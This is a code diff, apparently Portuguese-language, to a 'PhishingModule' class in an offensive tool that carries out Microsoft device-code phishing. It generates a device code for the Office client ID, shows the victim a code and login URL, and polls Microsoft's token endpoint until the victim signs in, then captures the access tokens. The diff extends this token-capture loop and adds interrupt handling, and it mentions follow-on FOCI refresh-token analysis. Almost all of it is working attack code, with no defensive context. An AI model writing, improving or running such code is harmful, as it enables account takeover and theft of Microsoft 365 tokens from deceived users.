@@ -429,24 +429,27 @@ class PhishingModule:
         print(f"  3. Login @{Config.TENANT_DOM}  ⏳ {expires_in//60}min\n{'='*65}")
 
         deadline = time.time() + expires_in
-        while time.time() < deadline:
-            time.sleep(interval)
-            try:
-                r = requests.post(
-                    f"https://login.microsoftonline.com/{Config.TENANT_ID}/oauth2/v2.0/token",
-                    data={"grant_type":"urn:ietf:params:oauth:grant-type:device_code",
-                          "device_code":dc,"client_id":client_id}, timeout=15)
-                result = r.json()
-            except requests.RequestException as e:
-                log.warn(f"Polling: {e}"); continue
-            if "access_token" in result:
-                return self._success(result, client_id, client_name)
-            err = result.get("error","")
-            if err == "authorization_pending": sys.stdout.write("."); sys.stdout.flush()
-            elif err == "slow_down": interval += 5
-            elif err in ("expired_token","access_denied"):
-                log.error(f"Encerrado: {err}"); return None
-            else: log.error(f"Erro: {result}"); return None
+        try:
+            while time.time() < deadline:
+                time.sleep(interval)
+                try:
+                    r = requests.post(
+                        f"https://login.microsoftonline.com/{Config.TENANT_ID}/oauth2/v2.0/token",
+                        data={"grant_type":"urn:ietf:params:oauth:grant-type:device_code",
+                              "device_code":dc,"client_id":client_id}, timeout=15)
+                    result = r.json()
+                except requests.RequestException as e:
+                    log.warn(f"Polling: {e}"); continue
+                if "access_token" in result:
+                    return self._success(result, client_id, client_name)
+                err = result.get("error","")
+                if err == "authorization_pending": sys.stdout.write("."); sys.stdout.flush()
+                elif err == "slow_down": interval = min(interval + 5, 30)
+                elif err in ("expired_token","access_denied"):
+                    log.error(f"Encerrado: {err}"); return None
+                else: log.error(f"Erro: {result}"); return None
+        except KeyboardInterrupt:
+            print(); log.warn("Polling interrompido pelo usuário."); return None
         log.error("Tempo esgotado."); return None
 
     def _success(self, result: Dict, client_id: str, client_name: str) -> Dict:
@@ -479,14 +482,50 @@ class PhishingModule:
         print("\n[11] GERAR URL DE PHISHING\n")
         tenant = input(f"  Tenant [{Config.TENANT_ID}]: ").strip() or Config.TENANT_ID
         cid    = input("  Client ID [Enter=Office]: ").strip() or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        client_name = next((n for n, c in Config.FOCI_CLIENTS.values() if c == cid), "Custom")
         try:
             r = requests.post(f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode",
                               data={"client_id":cid,"scope":Config.DEFAULT_SCOPE}, timeout=10)
             d = r.json()
         except Exception as e: log.error(str(e)); return
         if "user_code" not in d: log.error(str(d)); return
-        print(f"\n  URL   : https://microsoft.com/devicelogin")
-        print(f"  Código: \033[1;33m{d['user_code']}\033[0m  (expira {d.get('expires_in',900)//60}min)\n")
+
+        uc         = d["user_code"]; dc = d["device_code"]
+        expires_in = int(d.get("expires_in", 900))
+        interval   = int(d.get("interval", 5))
+        vuri       = d.get("verification_uri", "https://microsoft.com/devicelogin")
+
+        print(f"\n  URL   : {vuri}")
+        print(f"  Código: \033[1;33m{uc}\033[0m  (expira {expires_in//60}min)\n")
+
+        aguardar = input("  Aguardar token agora? (S/n): ").strip().lower()
+        if aguardar == "n":
+            return
+
+        log.info("Polling iniciado — aguardando autenticação...")
+        deadline = time.time() + expires_in
+        try:
+            while time.time() < deadline:
+                time.sleep(interval)
+                try:
+                    r = requests.post(
+                        f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
+                        data={"grant_type":"urn:ietf:params:oauth:grant-type:device_code",
+                              "device_code":dc,"client_id":cid}, timeout=15)
+                    result = r.json()
+                except requests.RequestException as e:
+                    log.warn(f"Polling: {e}"); continue
+                if "access_token" in result:
+                    return self._success(result, cid, client_name)
+                err = result.get("error","")
+                if err == "authorization_pending": sys.stdout.write("."); sys.stdout.flush()
+                elif err == "slow_down": interval = min(interval + 5, 30)
+                elif err in ("expired_token","access_denied"):
+                    log.error(f"Encerrado: {err}"); return None
+                else: log.error(f"Erro: {result}"); return None
+        except KeyboardInterrupt:
+            print(); log.warn("Polling interrompido pelo usuário."); return None
+        log.error("Tempo esgotado."); return None
 
 
 # ═══ FASE 2 — ANÁLISE FRT + VAULT ════════════════════════════════════════════
